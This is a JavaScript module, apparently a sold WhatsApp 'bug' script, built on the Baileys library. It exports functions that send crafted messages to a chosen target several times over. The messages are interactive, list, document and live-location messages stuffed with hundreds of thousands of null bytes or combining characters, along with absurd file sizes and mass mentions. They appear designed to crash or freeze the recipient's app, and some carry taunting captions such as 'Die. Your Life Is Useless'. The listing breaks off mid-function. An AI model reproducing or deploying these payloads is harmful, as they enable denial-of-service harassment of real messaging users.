/*

    ~£ ‹Dev: SkyZet
    ~£ ‹Base: SkyZet
    ~£ ‹Support:
         - CzA Agency
         - Devorsix
         - AlwasyQio
         - Tama
         - PandoraTeam
         - 1S Universe
         
    ~£ ‹Inspirate: 
         - SkyZet
         - Devorsix
         - PakTzy
         - AlwasyQio
         
    ~£ ‹Partner:
         - Devorsix
         - AlwasyQio
         
  注意事項 ›
      Gunakan Script Ini Sebijak Dan Sebaik Mungkin, Jangan Menyerang Mereka Yang Tidak Bersalah.
      Konsekuensi Keseluruhan Ditanggung Oleh Pemakai!
   -SkyZet
   

Want To Buy New Update Script?
    WhatsApp: wa.me/62857888108676
    Telegram: t.me/zetxcza
*/
require("../setting")
const { 
generateWAMessageFromContent,
generateWAMessageContent,
proto,
prepareWAMessageMedia,
emitGroupParticipantsUpdate,
emitGroupUpdate,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")

const fs = require("fs")
const { randomBytes } = require("crypto")
const warna = require('colors')
const { resize } = require("./function.js")

      const zLogo = "https://files.catbox.moe/rwic9j.jp"
      
const typeNullZet = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }

exports.lza = async (KyuuRzy, target) => {
  var buttonBugOldest = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "@SkyZet".repeat(100000),
            subtitle: "@SkyZet".repeat(100000)
          },
          body: {
            text: "@SkyZet".repeat(100000)
          },
          footer: {
            text: "Die. Your Life Is Useless  ".repeat(100000)
          },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: "{ display_text : ' ~€SkyZet? Wanna Be Yours ', url : , merchant_url :  }"
            }],
            messageParamsJson: "\0".repeat(100000)
          }
        }
      }
    }
  }), {
    userJid: target
  })
  
  for (let z = 0; z < 2; z++) {
  await KyuuRzy.relayMessage(target, buttonBugOldest.message, {
    participant: {
      jid: target
    },
    messageId: buttonBugOldest.key.id
  })
  console.log(warna.blue('─────「 SkyZet 」─────'))
  }
}

exports.xzeus = async (KyuuRzy, target) => {
    let virtex = "𝐂𝐨𝐫𝐫𝐮𝐩𝐭𝐞𝐝𝐁𝐲𝐙𝐞𝐭";
    let buttons = [];

    for (let i = 0; i < 100; i++) {
        buttons.push({
            name: "galaxy_message",
            buttonParamsJson: `{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"😂","flow_id":"DIEDIEDIEDIE🦷🦠","flow_message_version":"9","flow_token":"🥵🙏🏻📥😔#$($+}©=©÷€§~"}`
        });
    }

    KyuuRzy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true,
                            caption: "-I WILL DIE FOR YOU"+ "𑜦".repeat(51000)
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"","sections":[{"title":"","rows":[]}]}`
                            },
                            ...buttons,
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
    console.log(warna.brightGreen('─────「 SkyZet 」─────'))
}

exports.zbt2 = async (KyuuRzy, target) => {
var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
                'listMessage': {
                    'title': " " + "\0".repeat(920000),
                    'footerText': " ",
                    'description': " ",
                    'buttonText': null,
                    'listType': 2,
                    'productListInfo': {
                        'productSections': [{
                            'title': "button",
                            'products': [{
                                'productId': "1234567890"
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': "1234567890",
                            'jpegThumbnail': ""
                        },
                        'businessOwnerJid': "0@s.whatsapp.net"
                    }
                },
                'footer': ``,
                'contextInfo': {
                    'expiration': 172917292629161,
                    'ephemeralSettingTimestamp': "930719262782",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "WhatsApp",
                    'entryPointConversionApp': "WA Business",
                    'entryPointConversionDelaySeconds': 7193619162,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 2,
                'product_header_info': {
                    'product_header_info_id': 629159203611,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false
                }
            }), {
                'userJid': target
            });

for (let z = 0; z < 3; z++) {
            await KyuuRzy.relayMessage(target, messageContent.message, {
                'participant': {
                    'jid': target
                },
                'messageId': messageContent.key.id
            })
console.log(warna.red('─────「 SkyZet 」─────'))
}
        }
        
        
exports.zbt = async (KyuuRzy, target) => {
    let virtex = "Zet ᭄᭄᭄" + "𑜦".repeat(71000);
    let buttonsBUG = Array.from({ length: 70 }, () => ({
        name: 'galaxy_message',
        buttonParamsJson: '{}'
    }));

    let overJids = Array.from({ length: 30000 }, () => target);

for (let z = 0; z < 5; z++) {
    KyuuRzy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "638292925320",
                            pageCount: '22837391994',
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                            messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"ॏॏॏ\",\"header\":\" ॏॏॏ \",\"body\":\"xxx\"}",
                            buttons: [
                                { name: "single_select", buttonParamsJson: `{"title":"${"᬴".repeat(60000)}","sections":[{"title":" die with you ","rows":[]}]}` },
{ name: "payment_method", buttonParamsJson: "" },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                   voice_call: "call_galaxy",
                                   },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "form_message",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "wa_payment_learn_more",
                                    buttonParamsJson: "{}",
                                },
                               {
                                name: "wa_payment_transaction_details",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "wa_payment_fbpin_reset",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "catalog_message",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "payment_info",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "review_order",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "send_location",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "payments_care_csat",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "view_product",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "payment_settings",
                                    buttonParamsJson: "{}",
                                },
                                { 
                                    name: "single_select",
                                    buttonParamsJson: `{"title":" Lalalalala ","sections":[{"title":" TRYAGAIN ","rows":[]}]}`
                                },
                                {
                                name: "address_message",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "automated_greeting_message_view_catalog",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "open_webview",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "message_with_link_status",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "payment_status",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "message_with_link_status",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "extensions_message_v2",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "landline_call",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "mpm",
                                    buttonParamsJson: "{}",
                                },
                                {
                                name: "review_and_pay",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`,
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(100000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                    version: 3
                                },
                                {
                                name: "listMessage",
                                    'title': " " + "\0".repeat(920000),
                    'footerText': " ",
                    'description': " ",
                    'buttonText': null,
                    'listType': 2,
                    'productListInfo': {
                        'productSections': [{
                            'title': "button",
                            'products': [{
                                'productId': "1234567890"
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': "1234567890",
                            'jpegThumbnail': ""
                        },
                        'businessOwnerJid': "0@s.whatsapp.net"
                    },
                'footer': `\u0000`.repeat(50000),
                'contextInfo': {
                    'expiration': 172917292629161,
                    'ephemeralSettingTimestamp': "930719262782",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "WhatsApp",
                    'entryPointConversionApp': "WA Business",
                    'entryPointConversionDelaySeconds': 7193619162,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 2,
                'product_header_info': {
                    'product_header_info_id': 629159203611,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false,
                    'product_header_is_rejected': true,
                    'product_header_is_rejected': null,
                    'product_header_is_rejected': false
                }
                                    },
                                    {
                                name: "listMessage",
'title': "© 𝐒𝐤𝐲𝐙𝐞𝐭 𝐃𝐞𝐯 "+ "⽴҈ॏॏॏ" + "ॏॏॏ".repeat(920000),
        'footerText': ``,
        'description': ``,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'ↈAʟᴡᴀʏsᴀǫɪᴏᴏ.ʏᴀɴᴅᴇx.ᴄᴏᴍᬊᬁ',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        },
      'footer': 'ⓧAʟᴡᴀʏsᴀǫɪᴏᴏCʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ༻',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
                                    },
                                                                        {
                                name: "documentMessage",
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "ngaceng",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `© 𝐒𝐤𝐲𝐙𝐞𝐭 𝐃𝐞𝐯ᬁ`+"ॏॏॏ".repeat(65000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
                                    },
                                      {
                                name: "stickerMessage",
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
                                    },
                                                                          {
                                name: "interactiveMessage",
header: {
        title: "...—𝐒𝐤𝐲𝐙𝐞𝐭ᬁ📜",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: KyuuRzy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "「 SkyZet 」"
      },
      nativeFlowMessage: {
        messageParamsJson: "�".repeat(1000000)
      }
                                    },
                                    {
                                name: "payment_info",
buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
      },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}",
      },
      {
                                name: "listResponseMessage",
title: virtex,
                       listType: 1,
                       singleSelectReply: {
                           selectedRowId: "id"
                       },
                       contextInfo: {
                       isForwarded: true,
                           forwardedNewsletterMessageInfo: {
                               newsletterJid: "12@newsletter",
                               serverMessageId: 1,
                               newsletterName: ""
                           }
                       },
                       description: " i just wanna be yours "
                                    },
          {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":${virtex},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
          },
                            ],
                        },
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: ' ~#Zet NeverDie ',
                body: '—Being Stupid Is Hard',
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://t.me/zetxcza",
                mediaUrl: "https://skyzet.dev-lol/ml"
            }
        }
    }, { participant: { jid: target } }, { messageId: null })
    console.log(warna.red('─────「 SkyZet 」─────'))
  }
}


exports.uzc = async (KyuuRzy, target) => {
    let virtexNya = "📜𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ " + "\u0000".repeat(50000)
  for (let z = 0; z < 5; z++) {
    KyuuRzy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtexNya,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true,
                            caption: "- Kill Your System ☠️" + "ꦾ".repeat(51000)
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {"title":"\u0000","sections":[{"title":"\u0000","rows":[]}]}
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: {"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":":)","flow_id":"GASWARRRRRRR","flow_message_version":"9","flow_token":"DIEDIEDIEDIE"}
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null })
  }
  console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

exports.rdo = async (KyuuRzy, target, text, amount) => {
for (let z = 0; z < 2; z++) {
    await KyuuRzy.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        { participant: { jid: target } }
    )
  }
  console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

exports.locl = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
           viewOnceMessage: {
               message: {
                   liveLocationMessage: {
                       degreesLatitude: " 6.6.6 Zet-NeverDie ",
                       degreesLongitude: " Become A Man (SkyZ) ",
                       caption: bug.ccc + " \u0004".repeat(50000),
                       sequenceNumber: "0",
                       jpegThumbnail: ""
                   }
               }
           }
       }), 
       { userJid: target, quoted: typeNullZet }
   );

 for (let z = 0; z < 10; z++) {
   await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } });
   }
   console.log(warna.brightRed('─────「 SkyZet 」─────'))
}

exports.zcb = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
           viewOnceMessage: {
               message: {
                   interactiveMessage: {
                       header: {
                            title: "",
                            locationMessage: {},
                            hasMediaAttachment: true
                       },
                       body: {
                            text: bug.aaa
                       },
                       nativeFlowMessage: {
                           messageParamsJson: " Die, your life is useless. "  
                       },
                       carouselMessage: {}
                   }
               }
           }
       }), 
       { userJid: target, quoted: typeNullZet }
   );
 
   await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } });
   console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

exports.dbuz = async (KyuuRzy, target,) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "",
                        documentMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: bug.aaa
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐙͢͡𝐄𝐓̸ৄৄৄ𝐃͡𝐎͜𝐌͡𝐈𝐍͢𝐀̸𝐓̃𝐄 \",\"body\":\"xxx\"}",
                        buttons: [
                            { 
                                name: "single_select", 
                                buttonParamsJson: `{"title":"𝐙͢͡𝐄𝐓̸ৄৄৄ𝐃͡𝐎͜𝐌͡𝐈𝐍͢𝐀̸𝐓̃𝐄${"ःऀँ⿆".repeat(60000)}","sections":[{"title":" wanna die? huh. ","rows":[]}]}` 
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "payment_method",
                                buttonParamsJson: "{}",
                            },
                            { 
                                name: "single_select",
                                buttonParamsJson: `{"title":"𝐙͢͡𝐄𝐓̸ৄৄৄ𝐃͡𝐎͜𝐌͡𝐈𝐍͢𝐀̸𝐓̃𝐄","sections":[{"title":" ~#1S Secret Team ","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"SKYZET\",\"flow_message_version\":\"9\",\"flow_token\":\"DEVORSIXNZET\"}`,
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}",
                            }
                        ],
                    },
                    carouselMessage: {},
                    noteMessage: {}
                }
            }
        }
    }), 
    { userJid: target, quoted: typeNullZet }
    );

    for (let z = 0; z < 2; z++) {
        await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } });
    }
    console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

// not support in WhatsApp new
exports.bounds = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
               message: {
                   interactiveMessage: {
                       header: {
                            title: " ᚖ 𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️‎‏" + " \u0000".repeat(750000),
                            locationMessage: {},
                            hasMediaAttachment: true
                       },
                       body: {
                            text: ""
                       },
                       nativeFlowMessage: {
                           messageParamsJson: "\u0000".repeat(100000),
                           buttons: [
                               {
                                   name: "payment_info",
                                   buttonParamsJson: `{}`
                               }
                           ],
                       },
                   }
               }
           }
       }), 
       { userJid: target, quoted: null }
   )

 for (let z = 0; z < 2; z++) {
   await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
   }
   console.log(warna.brightYellow('─────「 SkyZet 」─────'))
}

exports.bounds2 = async (KyuuRzy, target) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
               message: {
                   interactiveMessage: {
                       header: {
                            title: " ᚖ 𝐃̶̸͠𝐎͢𝐌͡𝐈𝐍͜𝐀𝐓͡𝐈͜𝐎̸𝐍 𝐎̷̎͢𝐅 𝐙͢͡𝐄͌̀͒𝐓͠ ⚗️‎‏" + " \u0000".repeat(100000),
                            locationMessage: {},
                            hasMediaAttachment: true
                       },
                       body: {
                            text: ""
                       },
                       nativeFlowMessage: {
                           messageParamsJson: "\u0000".repeat(100000),
                           buttons: [
                               {
                                   name: "payment_info",
                                   buttonParamsJson: `{}`
                               }
                           ],
                       },
                   }
               }
           }
       }), 
       { userJid: target, quoted: typeNullZet }
   )

 for (let z = 0; z < 2; z++) {
   await KyuuRzy.relayMessage(target, etc.message, { participant: { jid: target } })
   }
   console.log(warna.red('─────「 SkyZet 」─────'))
}

exports.listr = async (KyuuRzy, target, text) => {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
           viewOnceMessage: {
               message: {
                   listResponseMessage: {
                       title: text,
                       listType: 1,
                       singleSelectReply: {
